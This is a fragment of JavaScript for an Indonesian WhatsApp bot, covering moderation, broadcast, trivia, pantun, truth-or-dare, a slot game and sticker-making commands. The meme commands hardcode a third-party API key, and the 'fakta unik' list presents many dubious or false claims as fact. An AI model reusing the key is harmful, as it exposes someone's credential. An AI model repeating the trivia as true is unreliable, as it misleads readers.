									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										ny = `${args[0].replace('@', '')}@c.us`
										Zeeone.blockUser (`${ny}@c.us`, "add")
										reply(`Nomor ${ny} telah di blockir!`)
										} else {
											ny = `${mentionUser}`
											Zeeone.blockUser (`${ny.replace("@s.whatsapp.net","@c.us")}`, "add")
											reply(`Nomor ${ny.replace("@s.whatsapp.net","@c.us")} telah blockir!`)
											}
									break
						case 'unblock':
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										ny = `${args[0].replace('@', '')}@c.us`
										Zeeone.blockUser (`${ny}@c.us`, "remove")
										reply(`Nomor ${ny} telah di unblockir!`)
										} else {
											ny = `${mentionUser}`
											Zeeone.blockUser (`${ny.replace("@s.whatsapp.net","@c.us")}`, "remove")
											reply(`Nomor ${ny.replace("@s.whatsapp.net","@c.us")} telah dibanned!`)
										}
									break
						case 'ban':
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										ny = `${args[0].replace('@', '')}@s.whatsapp.net`
										ban.push(ny)
										fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
										reply(`Nomor ${ny} telah dibanned!`)
										} else {
											ny = `${mentionUser}`
											ban.push(ny)
											fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
											reply(`Nomor ${ny} telah dibanned!`)
										}
									break
						case 'unban':
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (Ofc.message.extendedTextMessage === undefined || Ofc.message.extendedTextMessage === null) {
										ah = `${args[0].replace("@","")}@s.whatsapp.net`
										unb = ban.indexOf(ah)
										ban.splice(unb, 1)
										fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
										reply(`Nomor ${ah} telah di unban!`)
										} else {
											ah = `${mentionUser}`
											unb = ban.indexOf(ah)
											ban.splice(unb, 1)
											fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
											reply(`Nomor ${ah} telah di unban!`)
										}
									break
						case 'resetlimit':
									if (!isOwner && !Ofc.key.fromMe) return reply(mess.only.owner)
									Zeeone.updatePresence(from, Presence.avaible)
									fs.writeFileSync('./database/limit.json', ('[]'))
									reply('Sukses Lord')
									await sleep(5000)
									break
						case 'bc': case 'broadcast':
									if (!Ofc.key.fromMe && !isOwner) return reply(mess.only.owner) 
									if (args.length < 1) return reply(`${prefix + command} Alphabot`)
									anjir = await Zeeone.chats.all()
									for (let _ of anjir) {
										Zeeone.sendMessage(`${_.jid}`, 'BROADCAST' + '\n\n' + q, text, {quoted: ftroli})
										}
									reply('Sukses Lord')
									break
						case 'faktaunik':{
									const faktau = ["Negara Indonesia berada di posisi ke-4 sebagai Negara Terindah di Dunia versi situs First Choice.","Di Italia, dalam aturannya minuman Cappuccino hanya boleh di minum sebelum waktu siang.","AS, Australia, Finlandia, Jerman dan Kanada adl negara maju tanpa UN. Tahukah anda sekolah trbaik di dunia ada di Finlandia walau tanpa UN.","","\"Jengkol is very nice\" komentar Pierre Bouvier vokalis Simple Plan.","Tiap satu kali jari kita mengklik mouse komputer, ada 1,42 kalori yang terbakar dalam tubuh. (Penelitian, Convert Anything to Calories).","Di Jepang kuno, prajurit diolesi minyak kodok pada tubuh mereka dengan keyakinan bahwa hal itu akan membuat tubuh mereka antirobek."," Di Jepang, ketiduran saat bekerja (inemuri) dapat ditolerir, karena dipandang sebagai kelelahan yang muncul akibat bekerja terlalu keras.","Gergaji mekanik awalnya diciptakan sebagai alat kedokteran untuk membantu melahirkan bayi.","Jangan sering mengatakan kata  di Australia dan Selandia Baru. Di sana, kata berarti mengajak untuk melakukan hubungan seks.","Jamur merang Laetiporus dikenal sebagai julukan \"ayam hutan\" karena konon rasanya mirip seperti daging ayam goreng.","Kaki katak merupakan hidangan istimewa di eropa. Tahukah Anda: sekitar 80% impor katak Eropa berasal dari Indonesia.","Jika Anda mengetik \"do the harlem shake\" di search bar YouTube, layar akan melakukan Harlem Shake!. [Google Chrome]","Melihat melalui lubang kecil akan segera meningkatkan penglihatan Anda sementara.","YouTube menyebutkan rata-rata ada 4000 video baru Harlem Shake yang diunggah setiap hari. [Yahoo!]","Semut memiliki kuburan sendiri. Tapi tahukah anda: Gurita memiliki kebun dan suka berkebun. (wikipedia)","Coklat mengandung Theobromine, molekul organik yang dapat membantu menguatkan enamel gigi. (Penelitian dari Tulane University).","Wanita 2 kali lebih banyak menggunakan emoticon dalam pesan teks dibandingkan pria. (Penelitian di Rice University)","Biarpun Buzz Aldrin adalah orang kedua yang menginjak di bulan tetapi ia adalah orang pertama yang membuang kotoran di ruang angkasa.","Fakta unik berikutnya adalah, Psikolog mengatakan bahwa mengirim dan menerima pesan teks benar-benar dapat meningkatkan mood Anda ketika Anda merasa kesepian. (Telegraph)","Thailand merupakan satu-satunya negara di Asia Tenggara yang tidak pernah dijajah.","Musik memiliki kemampuan untuk memperbaiki kerusakan otak serta mengembalikan kenangan yang hilang. (cracked .com)"," Perasaan kesepian memicu respon yang sama di otak sebagai rasa sakit fisik. (BBCnews)","Di Cape Town, Afrika Selatan, remaja laki-laki yang memiliki gigi ompong dianggap tampan / maskulin.","Semakin pahit cokelat (tinggi zat theobromine), semakin tinggi manfaatnya. Rajin mengkonsumsi 1bar cokelat/hari dapat menyembuhkan batuk kronis.","Kata \"Mouse\" (tikus) berasal dari turunan Bahasa Sansekerta \"Mus\" yang berarti \"pencuri\".","Tidur Siang (Power Nap) trbukti menambah tinggi badan, dikrnkan saat kita tidur siang hormon pertumbuhan (Growth Hormone) lbh aktif bekerja.","Bilangan prima terbesar di dunia saat ini panjangnya 17 juta digit angka, cukup banyak untuk mengisi 28 lembar halaman pada buku novel.","Menurut sebuah studi, minum teh hijau setelah makan ikan membantu menghalangi zat Mercury yang terkandung dalam ikan memasuki aliran darah."," Memperpanjang usia handphone hingga 4 tahun dapat mengurangi dampak lingkungan sampai 40 persen. [Hasil studi di Swiss]","Duduk bersama dgn teman-teman / keluarga utk makan bersama, dpt meningkatkan kebahagiaan & membantu meringankan depresi. [ehealthnewsdaily]","Abibliophobia adalah fobia atau ketakutan terhadap kehabisan bahan bacaan.","Pada abad pertengahan di Eropa, garam sangat mahal harganya, sehingga disebut sebagai \"emas putih\".","Mengunyah permen karet dapat meningkatkan kemampuan berpikir cepat dan kewaspadaan hingga 10 persen. [Jurnal Brain and Cognition]","Wanita yang sedang stres selama kehamilannya cenderung melahirkan anak-anak yang pemarah. [Institute of Psychiatry, King College London]","","35. Disarankan supaya membeli sepatu pada sore hari. Sebab, setelah seharian berjalan, di sore hari kaki akan membesar 5-8 persen.","Musik memiliki kemampuan untuk memperbaiki kerusakan otak serta mengembalikan kenangan yang hilang. [cracked .com]","Menurut penelitian baru, usia harapan hidup anak band rata-rata lebih tinggi dibandingkan musisi yang memilih solo karir. (detikHealth)","Pulau Dewata Bali merupakan 1 dari 10 pulau paling romantis di dunia. [majalah Travel+Leisure]","Universitas di Jepang selalu melakukan upacara peringatan bagi hewan (contoh: tikus) yang mati dalam pengujian laboratorium. [web.archive .org]","Berkedip memberikan otak Anda istirahat sebentar. [para ilmuan di Japan’s Osaka University]","Wanita yang bahagia dalam sebuah pernikahan akan mengalami berat badan naik setengah pound (0,22 kg) setiap 6 bulan. [DailyMail]","Rasa cemburu berlebihan bisa digolongkan penyakit jiwa, krna dpt mendorong ssorg utk bunuh diri / menghabisi nyawa org lain. [riset]","","Mengkonsumsi buah tomat beberapa kali dlm kurun waktu seminggu dpt mengatasi perasaan depresi. [peneliti di Tianjin Medical Univ., Cina]"," Perasaan kesepian memicu respon yang sama di otak sebagai rasa sakit fisik. [BBCnews]","Di Cape Town, Afrika Selatan, remaja laki-laki yang memiliki gigi ompong dianggap tampan / maskulin.","Memeluk orang yg disayangi dpt membantu menurunkan tekanan darah, mengurangi stres dan","kecemasan, bahkn dpt meningkatkan memori. [Dailymail]","Kata \"Mouse\" (tikus) berasal dari turunan Bahasa Sansekerta \"Mus\" yang berarti \"pencuri\".Berjalan kaki atau bersepeda ke sekolah mempertajam konsentrasi siswa di kelas dan tetap bertahan sekitar 4 jam kemudian. [Medical Daily]","Menurut riset pasar global Euromonitor International, pria Korea adalah pria yang paling suka bersolek dari pria lain di dunia.","Rata-rata orang akan merasa 100 persen sehat / fit hanya 61 hari dalam setahun. (Penelitian di Inggris)","Polydactyl Cat adalah jenis kucing yang memiliki jempol di kaki mereka.","Hanya dengan mengurangi brightness dari televisi, anda mampu berhemat lebih dari Rp 1,5 juta setahun. [kompas]","Di Jerman, tahanan yg ingin meloloskan diri dr penjara adl bukan mrupakn perbuatan ilegal. Krn itu salah1 naluri dasar manusia untuk kebebasan.","Wanita merasa diri mereka terlihat paling jelek dan terlihat lebih tua pada hari Rabu pukul 15.30 . [studi baru dari St Tropez]Orang yang rutin bermain video game ternyata memiliki penalaran yang baik dibanding kebanyakan orang. (detikHealth)","Nama \"Gorila\" berasal dari kata Yunani \"Gorillai\" yang berarti \"perempuan berbulu\".","IBM mengatakan bahwa dalam kurun waktu 5 tahun ke depan, komputer bakal mirip manusia yang bisa melihat, mendengar, mencium dan merasakan.","Selama abad ke-13, kata \"nice\" sebenarnya berarti “stupid”, \"senseless\" dan “foolish\".","59. 49% dari pemilik Smartphone adalah jomblo. (Survei, \"2012 Online User Behavior and Engagement Study\")","Fakta Unik","60. Gazzarella adalah keju mozzarella yang terbuat dari susu kucing. 61. Rata-rata orang melihat / mengecek ponselnya sekitar 150 kali sehari. (Laporan Nokia pada MindTrek 2010)","Lalat dapat menyalurkan sekitar 300 bakteri setiap kali hinggap di benda.","Tertawa dapat meningkatkan aktivitas antibodi sekitar 20%, juga membantu untuk menghancurkan virus dan sel-sel tumor.","Fobia matematika (mathematics anxiety) memicu respon yang sama di otak sbg rasa sakit fisik. Gejalanya yaitu melihat angka saja sudah nyeri."," Karakter kartun Bugs Bunny diberi pangkat kehormatan sersan-mayor di Korps Marinir AS pada akhir Perang Dunia II. (wikipedia)","Apel yang ditaruh di ruang terbuka akan matang 10 kali lebih cepat dibandingkan dengan apel yang ditaruh di kulkas.","Ungkapan 'Smitten' adalah untuk menyebut 'naksir' dalam bahasa Inggris.","Menurut etiket internasional, sebuah jabat tangan yang tepat dan baik harus berlangsung selama sekitar 3 detik & dilepaskan setelah goyang.","Ketika kita sedang jatuh cinta, otak akan memproduksi dopamin ekstra, bahan kimia yang membuat seseorang menjadi gembira berlebihan."," \"Mwahahaha\" dan \"lolz\" telah ditambahkan ke Kamus Inggris Oxford.","Menurut penelitian, pria cenderung menurunkan volume suaranya ketika ia berbicara dg seseorang yg ia cintai, sementara perempuan sebaliknya.","Di Perancis, jajanan Arum Manis (Rambut Nenek) disebut \"Barbe á Papa\" yang berarti \"Jenggot Ayah\".","Menurut penelitian, PR terlalu banyak sebenarnya dapat menyebabkan siswa menjadi stres, depresi & mendapat nilai lebih rendah.","Hangry adalah penggabungan kata dari \"Hungry\" dan \"Angry\", di pakai ketika anda sedang lapar dan marah.","Kentut dari bakteri membuat keju swiss memiliki lubang-lubang.","Mendengarkan musik benar-benar dapat mengurangi rasa sakit kronis hingga 20% dan membantu meringankan depresi hingga 25%. (sciencedaily)","Orang yang merasa kesepian memiliki kemungkinan mengalami kepikunan 70-80% lebih tinggi. (Journal of Neurosurgery Neurologi and Psychiatry)","Melamun dpt memendekkan telomere (bagian paling ujung sel DNA) yang berperan dlm menjaga kestabilan sel, dimana dapat mempercepat proses penuaan."]
									const ran_faktau = faktau[Math.floor(Math.random() * faktau.length)]
									reply(`*Fakta Unik :*\n${ran_faktau}`)
									}
									break
						case 'pantun':{
									const pantun = ["\nAnak tikus rindu ibunya\n\nsombong nich ceritanya","\nAda kepompong ada kupu\n\nbales donk sms dari aku","\nBeli bandeng\n\ndi Malaysia\n\ngue ganteng\n\nkayak Pasha","\nHati siapa tak bimbang\n\nsitu botak minta dikepang","\nBuah semangka\n\nbuah duren\n\nnggak nyangka\n\ngue keren\n ","\n Mawar bersemi\n\ndi batang kayu\n\ndo you love me\n\nlike i love you","\nBurung perkutut\n\nburung kuthilang\n\nkamu kentut\n\nenggak bilang bilang","\nBread is roti\n\nshadow is bayang\n\nbefore you mati\n\nbetter you sembahyang","\nJangan takut\n\njangan khawatir\n\nitu kentut\n\nbukan petir","\nBeli ikan di pasar malam\n\ndasar bego ni kawan","\nMakan duren sambil ngelamun,\n\nHati-hati ketelen ntar bijinya","\nDi  sana gunung, di sini gunung\n\nCiptaan Tuhan deh","\nKan bandeng\n\nmakan kawat\n\norang ganteng\n\nnumpang lewat","\nOrang ganteng\n\nsuka sama si Rini\n\ngak seneng\n\nmaju sini","\nMelon manis di air es\n\nke mana aja lo gak pernah sms","\nJambu merah\n\ndi dinding\n\njangan marah\n\njust kidding","\nBuah semangka\n\nbuah manggis\n\nnggak nyangka\n\ngue manis","\nMen sana\n\nin corpore sano\n\ngue maen ke sana,\n\nelo maen ke sono!","\nBuah apel\n\ndi air payau\n\nnggak level\n\nlayauuuuuuu","\nDi sini bingung, di sana linglung\n\nemangnya enak, enggak nyambung…","\nBuah semangka berdaun sirih\n\nBuah ajaib kali yah","\nPilih suara harpa yang jelas.\n\nTali di harpa diikat cinta","\nCiuman di pipi\n\nciuman di dahi\n\nApa yang dicium sesudah lah cinta?","\nSepandai-pandai tupai melompat\n\nPolisi lebih pandai melompat","\nDua tiga kacang tanah\n\nenggak ada pacar yang datang ke rumah","\nDapet kado isinya tomat\n\nBodo amat!!","\nDulu delman, sekarang gokar\n\ndulu teman, sekarang pacar","\nStroberi mangga apel\n\nsorry gak level","\nBola pingpong dimakan gelatik\n\nBiar ompong yang penting cantik\n","\nMata belo,\n\nala komedian.\n\ngue sama elo?\n\nmaunya jadian.","\nTunda lapar,\n\nmakan indomi.\n\nhati menggelepar,\n\ncintapun bersemi.","\nPotong kuku,\n\npendek-pendek.\n\nhatiku beku,\n\nsi abang mendadak ngondek.","\nBeli ketan,\n\nbeli kain songket.\n\nbiar udah mantan,\n\nkita tetep lengket.","\nKe pasar, nyari obat gatal\n\nDasar, gak modal!","\nMakan semangka,\n\nmakan kedondong.\n\nkalau suka,\n\nnyatain dong.","\nGa punya pendirian,\n\nbikin jemu.\n\nga mau sendirian,\n\nmaunya bobo sama kamu.","\nNembak itik,\n\nlangsung kena.\n\nkamu cantik,\n\nhey nona!","\nKotak amal,\n\ndigoyang-goyang.\n\nkemarin aku diramal,\n\njodohnya sama abang.","\nHari Jumat,\n\npada pake batik.\n\nsalam hormat,\n\nbuat neng cantik.","\nPecahan genting,\n\ndi bawah kursi.\n\nbetah meeting,\n\nkarena si boss seksi.","\nNangis-nangis,\n\nmobil kena srempet.\n\nneng manis,\n\nmau dong dipepet.","\nPanasin mentega,\n\nkarena mulai beku.\n\nkamu mau ga,\n\njadi imamku?","\nPotong sebahu,\n\nbiar ga sendu.\n\nkamu tahu?\n\nAku rindu.","\nJangan tanya,\n\nkapan lulus kuliah.\n\nga dapet anaknya,\n\nmamanya boleh lah","\nBikin anak,\n\ndi pojokan sekolah\n\nkalau mau enak,\n\nnikah dulu lah.","\nMain mata,\n\nmesem-mesem.\n\nneng tetep cinta,\n\nbiarpun abang keteknya asem.","\nTiduran di tandu,\n\nberjam-jam.\n\nhati merindu,\n\nmata sulit memejam.","\nUbek-ubek peti,\n\ncari gunting.\n\nsaking cinta mati,\n\nneng rela bunting.","\nNamanya penjahat,\n\npolisi jadi inceran.\n\nbosan jadi temen curhat,\n\nmaunya pacaran.","\nKe salon creambath,\n\nbiar aliran darah lancar.\n\nbosen ah jadi sahabat,\n\nmaunya jadi pacar!"]
									const ran_pantun = pantun[Math.floor(Math.random() * pantun.length)]
									reply(`*Pantun :* \n${ran_pantun}`)
									}
									break
						case 'dare':
									const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "🦄💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
									const der = dare[Math.floor(Math.random() * dare.length)]
									sendButMessage(from, `${der}`, `${ucapannya}`, [
									{
										buttonId: `dare`,
										buttonText: {
											displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
									break
						case 'truth':
									const trut = ['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
									const ttrth = trut[Math.floor(Math.random() * trut.length)]
									sendButMessage(from, `${ttrth}`, `${ucapannya}`, [
									{
										buttonId: `truth`,
										buttonText: {
											displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
									break
						case 'slot':
									const sotoy = ['🍊 : 🍒 : 🍐','🍒 : 🍐 : 🍊','🍐 : 🍒 : 🍐','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔','🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇 ','🍌 : 🍒 : 🔔','🍐 : 🔔 :  🔔','🍊 : 🍋 :  🍒','🍋 : 🍋 :  🍌','?? : 🔔 : 🍇','🔔 : 🍐 :  🍇','🔔 : 🔔 :  🔔','🍒 : 🍒 :  🍒','🍌 : 🍌 : 🍌','🍇 : ?? : 🍇']
									somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
									somtoyy = sotoy[Math.floor(Math.random() * (sotoy.length))]
									somtoyyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
									rn = randomNomor(100)
									if (somtoyy== '🍌 : 🍌 : 🍌') {
										bp = await sendButMessage(from, `─『 🎰 *SLOT*  🎰 』─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲ 👑 *YOU WIN* 👑 ❳──\nHADIAH : $${rn}`, `Main Lagi? Klik Di Bawah `, [
									{
										buttonId: `slot`,
										buttonText: {
											displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
										addBalance(sender, rn, balance)
										} else if (somtoyy == '🍒 : 🍒 : 🍒') {
									bp = await sendButMessage(from, `─『 🎰  *SLOT*  🎰 』─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲ 👑 *YOU WIN* 👑 ❳──\nHADIAH : $${rn}`, `Main Lagi? Klik Di Bawah `, [
									{
										buttonId: `slot`,
										buttonText: {
											displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
									addBalance(sender, rn, balance)
										} else if (somtoyy == '🔔 : 🔔 : 🔔') {
											bp = await sendButMessage(from, `─『 🎰  *SLOT*  🎰 』─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲ 👑 *YOU WIN* 👑 ❳──\nHADIAH : $${rn}`, `Main Lagi? Klik Di Bawah `, [
											{
												buttonId: `slot`,
												buttonText: {
													displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
											addBalance(sender, rn, balance)
												} else if (somtoyy == '🍐 : 🍐 : 🍐') {
													bp = await sendButMessage(from, `─『 🎰  *SLOT*  🎰 』─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲ 👑 *YOU WIN* 👑 ❳──\nHADIAH : $${rn}`, `Main Lagi? Klik Di Bawah `, [
											{
												buttonId: `slot`,
												buttonText: {
													displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
													addBalance(sender, rn, balance)
														} else if (somtoyy == '🍇 : 🍇 : 🍇') {
															bp = await sendButMessage(from, `─『 🎰  *SLOT*  🎰 』─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲ 👑 *YOU WIN* 👑 ❳──\nHADIAH : $${rn}`, `Main Lagi? Klik Di Bawah `, [
											{
												buttonId: `slot`,
												buttonText: {
													displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
															addBalance(sender, rn, balance)
																} else {
																	ok = await sendButMessage(from, `─『 🎰  *SLOT*  🎰 』─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲  *YOU LOSE*  ❳──\nXP BERKURANG 1000`, `Main Lagi? Klik Di Bawah `, [
											{
												buttonId: `slot`,
												buttonText: {
													displayText: `NEXT ➡️`,
											},
											type: 1,
											}]);
																	addLevelingXp(sender, -1000)
																	}
															break
						case 'attp':{ 
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if (args.length < 1) return reply(`Kirim perintah *${prefix}attp* teks`)
									let ane = await getBuffer(`https://api.xteam.xyz/attp?file&text=${q}`)
									fs.writeFileSync('./sticker/attp.webp', ane)
									exec(`webpmux -set exif ./sticker/data.exif ./sticker/attp.webp -o ./sticker/attp.webp`, async (error) => {
										if (error) return reply(mess.error)
										Zeeone.sendMessage(from, fs.readFileSync(`./sticker/attp.webp`), sticker, {quoted: Ofc})
										fs.unlinkSync(`./sticker/attp.webp`)
									})
									}
									limitAdd(sender, limit)
									break
						case 'memegenerator': case 'memegen':
									if (!isPremium && !Ofc.key.fromMe) return reply(mess.only.prem)
									if (args.length < 1) return reply(`Kirim perintah *${prefix + command}* teks atas|teks bawah`)
									if (!q.includes('|')) return reply(`Kirim perintah *${prefix + command}* teks atas|teks bawah`)
									try {
										if (!isQuotedImage && !isQuotedSticker) return reply(`Reply Gambar Atau Sticker!`)
										reply(mess.wait)
										var teks1 = q.split('|')[0] ? q.split('|')[0] : ''
										var teks2 = q.split('|')[1] ? q.split('|')[1] : ''
										var imgbb = require('imgbb-uploader')
										var enmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										var media = await Zeeone.downloadAndSaveMediaMessage(enmedia)
										var njay = await imgbb('3b8594f4cb11895f4084291bc655e510', media)
										var resu = await getBuffer(`https://api.memegen.link/images/custom/${teks1}/${teks2}.png?background=${njay.display_url}`)
										Zeeone.sendMessage(from, resu, image, {thumbnail: thumbnail, quoted: Ofc})
										fs.unlinkSync(media)
										} catch (e) {
											return reply(`${e}`)
											console.log(e)
										}
									break
						case 'stickermeme': case 'memesticker': case 'memestick': case 'stickmeme': case 'stcmeme': case 'smeme':
									if (!isPremium && !Ofc.key.fromMe) return reply(mess.only.prem)
									try {
										if (!q) return reply(`${prefix+command} Alphabot`)
										var bawah = q.replace('', '_').replace('\n','%5Cn').replace('?', '~q').replace('%', '~p').replace('&', '~a').replace('#', '~h').replace('/', '~s')
										if ( isQuotedImage) {
											reply(mess.wait)
											var imgbb = require('imgbb-uploader')
											let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
											let media = await Zeeone.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
											var tolink = await imgbb("3b8594f4cb11895f4084291bc655e510", media)
											var sticknye = `https://api.memegen.link/images/custom/-/${bawah}.png?background=${tolink.display_url}`
											//var short = await axios.get('https://tinyurl.com/api-create.php?url=' + sticknye)
											//var anuu = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebp?apikey=${lolkey}&img=${short.data}`)
											fs.writeFileSync('./sticker/smemek.webp', sticknye)
											exec(`webpmux -set exif ./sticker/data.exif ./sticker/smemek.webp -o ./sticker/smemek.webp`, async (error) => {
												if (error) return reply(mess.error)
												Zeeone.sendMessage(from, fs.readFileSync(`./sticker/smemek.webp`), sticker, { quoted: Ofc })
												})
												} else if (isQuotedSticker){
													reply(mess.wait)
													var imgbb = require('imgbb-uploader')
													let encmedia = JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
													let media = await Zeeone.downloadAndSaveMediaMessage(encmedia)
													let ran = getRandom('.png')
													exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
														fs.unlinkSync(media)
														if (err) return reply('Error')
														var tolink = await imgbb("3b8594f4cb11895f4084291bc655e510", ran)
														var sticknye = `https://api.memegen.link/images/custom/-/${bawah}.png?background=${tolink.display_url}`
														//var short = await axios.get('https://tinyurl.com/api-create.php?url=' + sticknye)
														//var anuu = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebp?apikey=${lolkey}&img=${short.data}`)
														fs.writeFileSync('./sticker/smemek.webp', sticknye)
														exec(`webpmux -set exif ./sticker/data.exif ./sticker/smemek.webp -o ./sticker/smemek.webp`, async (error) => {
															if (error) return reply(mess.error)
															Zeeone.sendMessage(from, fs.readFileSync(`./sticker/smemek.webp`), sticker, { quoted: Ofc })
															fs.unlinkSync(ran)
															})
														})
														} else {
															reply(`Reply gambar atau sticker dengan Caption ${prefix+command} teks`)
															}
														} catch (e) {
															return reply(`${e}`)
															console.log(e)
														}
													break
						case 'emoji':case 'semoji':
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									if (!q) return reply(`Example : ${prefix + command} 😂`)
									hex2 = args.join(' ') 
									emoji.get(`${hex2}`).then(emoji => {
										teks = `${emoji.images[4].url}`
										sendStickerFromUrl(from,`${teks}`)
									})
									limitAdd(sender, limit)
									break
						case 'stickerwm': case 'swm': case 'take': case 'takesticker': case 'takestick':{
									if (!Ofc.key.fromMe && !isPremium) return reply(mess.only.prem)
									reply(mess.wait) 
									let packname1 = q.split('|')[0] ? q.split('|')[0] : q
									let author1 = q.split('|')[1] ? q.split('|')[1] : ''
									if (isQuotedImage) {
										let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
										let media = await Zeeone.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
										exif.create(packname1, author1, `stickwm_${sender}`)
										await ffmpeg(`${media}`)
										.input(media)
										.on('start', function (cmd) {
											console.log(color(`STARTED : ${cmd}`,'yellow'))
											})
											.on('error', function (err) {
												console.log(color(`ERROR : ${err}`,'red'))
												fs.unlinkSync(media)
												reply(mess.error)
												})
												.on('end', function () {
													console.log(color(`FINISH`,'magenta'))
													exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
														if (error) return reply(mess.error)
														Zeeone.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: Ofc})
														fs.unlinkSync(media)
														fs.unlinkSync(`./sticker/${sender}.webp`)
														fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
														})
														})
														.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
														.toFormat('webp')
														.save(`./sticker/${sender}.webp`)
														} else if (( isQuotedVideo && Ofc.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
															let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(Ofc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Ofc
															let media = await Zeeone.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
															exif.create(packname1, author1, `stickwm_${sender}`)
															reply(mess.wait)
															await ffmpeg(`${media}`)
															.inputFormat(media.split('.')[4])
															.on('start', function (cmd) {
																console.log(color(`STARTED : ${cmd}`,'yellow'))
																})
																.on('error', function (err) {
																	console.log(color(`ERROR : ${err}`,'red'))
																	fs.unlinkSync(media)
																	let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
																	reply(mess.error)
																	})
																	.on('end', function () {
																		console.log((`FINISH`,'magenta'))
